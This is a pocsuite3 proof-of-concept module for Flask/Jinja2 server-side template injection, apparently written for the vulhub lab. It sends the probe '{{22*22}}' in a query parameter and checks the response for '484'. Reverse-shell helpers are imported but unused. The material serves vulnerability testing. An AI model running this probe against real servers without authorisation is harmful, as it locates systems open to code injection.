from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout
from urllib.parse import urljoin

class DemoPOC(POCBase):
    vulID = '111'
    version = '3.0'
    author = ['liao']
    vulDate = '2017-12-14'
    createDate = '2017-12-14'
    updateDate = '2017-12-14'
    references = ['https://github.com/vulhub/vulhub/tree/master/flask/ssti']
    name = 'Flask（Jinja2） SSTI'
    appPowerLink = ''
    appName = 'flask'
    appVersion = '1.x'
    vulType = 'SSTI'
    desc = '''
    flask服务器模板注入漏洞
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        path = "/?name="
        url = urljoin(self.url, path)
        payload = "{{22*22}}"
        resp = requests.get(url + payload)
        try:
            if resp and resp.status_code == 200 and "484" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Name'] = payload
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)
